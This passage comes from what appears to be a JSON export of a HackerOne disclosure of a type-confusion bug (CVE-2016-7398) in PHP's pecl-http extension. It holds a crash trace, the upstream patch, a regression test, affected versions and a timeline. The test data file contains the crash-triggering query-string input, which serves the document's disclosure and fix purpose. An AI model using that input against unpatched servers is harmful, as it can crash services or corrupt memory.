http_querystr.php(5): http\\QueryString-&gt;__construct(&#39;[[[[[[[[[[[[[[[...&#39;)\n    #1 {main}\n\n    Next \n      thrown in http_querystr.php on line 5\n    *** Error in `sapi/cli/php&#39;: free(): invalid pointer: 0x0000000001091f50 ***\n    Program received signal SIGABRT, Aborted.\n    0x00007ffff577804f in raise () from /usr/lib/libc.so.6\n</code></pre>\n<h1 id=\"patch\">Patch</h1>\n\n<p>After careful review by the project maintainers the following patch may be used<br>\nto fix the reported issue. </p>\n<pre class=\"highlight plaintext\"><code>From 34ae784c44be4a60157947f8ccc8c918e9b6ba40 Mon Sep 17 00:00:00 2001\nFrom: rc0r &lt;hlt99@blinkenshell.org&gt;\nDate: Fri, 9 Sep 2016 11:31:57 +0200\nSubject: [PATCH] Type confusion vulnerability in merge_param() (#73055) fixed\n\n---\n src/php_http_params.c   |  2 +-\n tests/bug73055.phpt     | 25 +++++++++++++++++++++++++\n tests/data/bug73055.bin |  1 +\n 3 files changed, 27 insertions(+), 1 deletion(-)\n create mode 100644 tests/bug73055.phpt\n create mode 100644 tests/data/bug73055.bin\n\ndiff --git a/src/php_http_params.c b/src/php_http_params.c\nindex 8988f43..0846f47 100644\n--- a/src/php_http_params.c\n+++ b/src/php_http_params.c\n@@ -489,7 +489,7 @@ static void merge_param(HashTable *params, zval *zdata, zval **current_param, zv\n            zval *test_ptr;\n\n            while (Z_TYPE_P(zdata_ptr) == IS_ARRAY &amp;&amp; (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {\n-               if (Z_TYPE_P(test_ptr) == IS_ARRAY) {\n+               if ((Z_TYPE_P(test_ptr) == IS_ARRAY) &amp;&amp; (Z_TYPE_P(ptr) == IS_ARRAY)) {\n                    zval *tmp_ptr = ptr;\n\n                    /* now find key in ptr */\ndiff --git a/tests/bug73055.phpt b/tests/bug73055.phpt\nnew file mode 100644\nindex 0000000..260e823\n--- /dev/null\n+++ b/tests/bug73055.phpt\n@@ -0,0 +1,25 @@\n+--TEST--\n+Type confusion vulnerability in merge_param()\n+--SKIPIF--\n+&lt;?php\n+include &quot;skipif.inc&quot;;\n+?&gt;\n+--FILE--\n+&lt;?php\n+\n+echo &quot;Test\\n&quot;;\n+try {\n+   echo new http\\QueryString(file_get_contents(__DIR__.&quot;/data/bug73055.bin&quot;)); // &lt;- put provided sample into correct location\n+} catch (Exception $e) {\n+   echo $e;\n+}\n+?&gt;\n+\n+===DONE===\n+--EXPECTF--\n+Test\n+%r(exception &#39;)?%rhttp\\Exception\\BadQueryStringException%r(&#39; with message &#39;|: )%rhttp\\QueryString::__construct(): Max input nesting level of 64 exceeded in %sbug73055.php:5\n+Stack trace:\n+#0 %sbug73055.php(5): http\\QueryString-&gt;__construct(&#39;[[[[[[[[[[[[[[[...&#39;)\n+#1 {main}\n+===DONE===\n\\ No newline at end of file\ndiff --git a/tests/data/bug73055.bin b/tests/data/bug73055.bin\nnew file mode 100644\nindex 0000000..ad2dd9f\n--- /dev/null\n+++ b/tests/data/bug73055.bin\n@@ -0,0 +1 @@\n+[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]][[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[&amp;%C0[]E[=&amp;2[&amp;%C0[]E[16706[*[\n\\ No newline at end of file\n-- \n2.9.3\n</code></pre>\n<h1 id=\"versions-known-to-be-affected\">Versions known to be affected</h1>\n\n<p>pecl-http extension versions up to and including:</p>\n\n<ul>\n<li>3.1.0beta2 (PHP 7)</li>\n<li>2.6.0beta2 (PHP 5)</li>\n</ul>\n\n<h1 id=\"timeline\">Timeline</h1>\n\n<p>2016-09-09  Initial report to PHP bug tracker (#73055)<br>\n2016-09-12  Issue fixed in git repository, CVE requested<br>\n2016-09-13  Mitre assigned CVE-2016-7398</p>\n\n<h1 id=\"references\">References</h1>\n\n<p><a title=\"https://bugs.php.net/bug.php?id=73055\" href=\"/redirect?signature=5a075b089edeb931af6983958947e8f844086bd6&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73055\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=73055</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83\" href=\"/redirect?signature=42ca39a5ec4a2927eb65ce1cee9c5e519fe7796b&amp;url=https%3A%2F%2Fgithub.com%2Fm6w6%2Fext-http%2Fcommit%2F17137d4ab1ce81a2cee0fae842340a344ef3da83\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398\" href=\"/redirect?signature=cbd3ca7a599cff9d9cdbf3120afb00e1802392df&amp;url=http%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2016-7398\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398</span><i class=\"icon-external-link\"></i></a></p>\n", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.php.net", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "PHP (IBB)"
+        }, 
+        "handle": "ibb-php", 
+        "url": "https://hackerone.com/ibb-php", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 29, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
